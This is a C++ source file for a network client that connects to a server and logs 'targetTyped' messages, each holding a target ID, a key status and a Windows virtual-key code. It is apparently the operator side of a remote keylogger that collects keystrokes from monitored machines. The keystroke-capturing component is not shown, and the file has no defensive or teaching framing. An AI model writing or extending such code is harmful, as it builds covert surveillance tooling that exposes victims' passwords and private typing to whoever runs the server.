#include "client.h"

Client::Client(uint64_t(*scrambleFunc)(uint64_t))
    : kq::client_interface<messageType>(scrambleFunc),
	logger("client_output.txt", "./"),
	networkingThread(&Client::networkInitAndLoop, this), networkLoop(true)
{
	
}

Client::~Client()
{
	logger.out(KQINFO, { "Disconnecting from server...\n" });
	networkLoop = false;

	kq::message<messageType> msg(messageType::clientDisconnected);
	Send(msg);
	Disconnect();
}


void Client::networkInitAndLoop()
{
	logger.out(KQINFO, { "Connecting to server...\n" });
	if (!Connect(server_ip, server_port))
	{
		logger.out(KQINFO, { "Failed connecting to server!\n" });
		return;
	}
	logger.out(KQINFO, { "Successfuly connected to server!\n" });
	kq::message<messageType> msg(messageType::clientConnected);
	Send(msg);
	while (networkLoop)
	{
		if (!Incoming().empty())
		{
			auto msg = Incoming().pop_front().msg;
			switch (msg.getID())
			{
			case messageType::targetTyped:
				uint32_t targetID;
				msg >> targetID;
				keyStatus status;
				msg >> status;
				DWORD virtualKey;
				msg >> virtualKey;

				logger.out( KQINFO, { "Target {} typed: VK - {}\n", targetID, virtualKey});
				break;
			default:
				break;
			}
		}
	}
}